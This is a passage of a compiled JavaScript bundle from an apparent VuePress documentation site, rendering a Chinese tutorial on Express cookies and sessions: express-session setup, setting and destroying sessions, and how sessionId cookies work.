"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3600000")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("24")]),s._v("）"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//一周")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Date")]),s._v("（Date"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("now")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3600000")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("24")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("）"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])])]),a("h2",{attrs:{id:"session"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#session","aria-hidden":"true"}},[s._v("#")]),s._v(" Session")]),s._v(" "),a("h3",{attrs:{id:"session介绍"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#session介绍","aria-hidden":"true"}},[s._v("#")]),s._v(" session介绍")]),s._v(" "),a("ul",[a("li",[s._v("因为cookie是保存在客户端的数据，不够安全，所以出现了session。")]),s._v(" "),a("li",[s._v("session会将数据保存到服务器端（保存在文件、内存服务器或数据表中），安全性就可以得到保证。")])]),s._v(" "),a("h3",{attrs:{id:"设置-读取session"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置-读取session","aria-hidden":"true"}},[s._v("#")]),s._v(" 设置/读取session")]),s._v(" "),a("p",[s._v("express设置session时，需要使用第三方模块 --- express-session")]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("npm")]),s._v(" i express-session\n")])])]),a("p",[s._v("使用步骤：")]),s._v(" "),a("ol",[a("li",[a("p",[s._v("加载 express-session 模块")])]),s._v(" "),a("li",[a("p",[s._v("将session注册为中间件")])]),s._v(" "),a("li",[a("p",[s._v("使用req.session对象设置/读取session")])])]),s._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//1. 加载 express-session 模块")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" session "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("require")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'express-session'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//2. 配置项")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" obj "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    secret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'4ey32erfyf3fgpg'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("   "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//加密字符串。 使用该字符串来加密session数据，自定义")]),s._v("\n    resave"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("false")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("               "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//强制保存session即使它并没有变化")]),s._v("\n    saveUninitialized"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("false")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//强制将未初始化的session存储。当新建了一个session且未")]),s._v("\n    \t\t\t\t\t\t\t "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设定属性或值时，它就处于未初始化状态。")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//3. 注册为express-session中间件")]),s._v("\napp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("use")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("session")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("obj"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//4. 使用 req.session.属性 = 值  方式来设置session")]),s._v("\napp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("get")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/sets'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" res"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=>")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("session"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("isLogin "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("session"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("userInfo "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("user_id"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10001")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" user_name"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"zs"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//注意：一定要将数据发回给浏览器，否则session无法生效")]),s._v("\n    res"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("send")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'设置session'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设置好之后，req.session中的结构")]),s._v("\nreq"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("session "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    isLogin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    userInfo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("user_id"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10001")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" user_name"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"zs"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),a("h3",{attrs:{id:"session有效期"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#session有效期","aria-hidden":"true"}},[s._v("#")]),s._v(" session有效期")]),s._v(" "),a("ul",[a("li",[s._v("当浏览器关闭后，session消失")]),s._v(" "),a("li",[s._v("express-session会将session保存在内存中，每次重启服务器时即使没有关闭浏览器session也会消失")])]),s._v(" "),a("h3",{attrs:{id:"删除session"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#删除session","aria-hidden":"true"}},[s._v("#")]),s._v(" 删除session")]),s._v(" "),a("p",[s._v("核心： req.session.destroy()    销毁所有session")]),s._v(" "),a("p",[a("img",{attrs:{src:e(263),alt:"1550720468344"}})]),s._v(" "),a("h3",{attrs:{id:"session-的有效范围"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#session-的有效范围","aria-hidden":"true"}},[s._v("#")]),s._v(" session 的有效范围")]),s._v(" "),a("p",[s._v("在一个网站中设置了session，则整个网站都能找到这个session")]),s._v(" "),a("h2",{attrs:{id:"cookie-和-session-的原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie-和-session-的原理","aria-hidden":"true"}},[s._v("#")]),s._v(" Cookie 和 Session 的原理")]),s._v(" "),a("h3",{attrs:{id:"cookie原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie原理","aria-hidden":"true"}},[s._v("#")]),s._v(" cookie原理")]),s._v(" "),a("ol",[a("li",[a("p",[s._v("浏览器第一次访问带有cookie设置的路由时，服务器会将cookie信息通过响应头返回给浏览器")])]),s._v(" "),a("li",[a("p",[s._v("之后浏览器每次访问服务器时都会将cookie信息通过请求头发送给服务器")])])]),s._v(" "),a("h3",{attrs:{id:"session原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#session原理","aria-hidden":"true"}},[s._v("#")]),s._v(" session原理")]),s._v(" "),a("p",[a("img",{attrs:{src:e(264),alt:"4"}})]),s._v(" "),a("ol",[a("li",[a("p",[s._v("浏览器第一次访问带有session设置的路由时，服务器会自动产生一个sessionId（一个很长的随机字符串），该sessionId有两个作用")]),s._v(" "),a("p",[s._v("① 随着cookie返回给浏览器，保存在浏览器中   （==相当于一把钥匙==）")]),s._v(" "),a("p",[s._v("② 在服务器开辟一块内存并以该sessionId命名，将数据保存在该内存中 （==相当于一个箱子==）")])]),s._v(" "),a("li",[a("p",[s._v("浏览器之后每一次访问服务器时，sessionId都会随着请求头发送给服务器，服务器就能根据sessionId")])])]),s._v(" "),a("h2",{attrs:{id:"参考资料"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考资料","aria-hidden":"true"}},[s._v("#")]),s._v(" 参考资料")]),s._v(" "),a("ul",[a("li",[s._v("https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies")])])])}],o=e(0),n=Object(o.a)({},function(){this.$createElement;this._self._c;return this._m(0)},a,!1,null,null,null);t.default=n.exports}}]);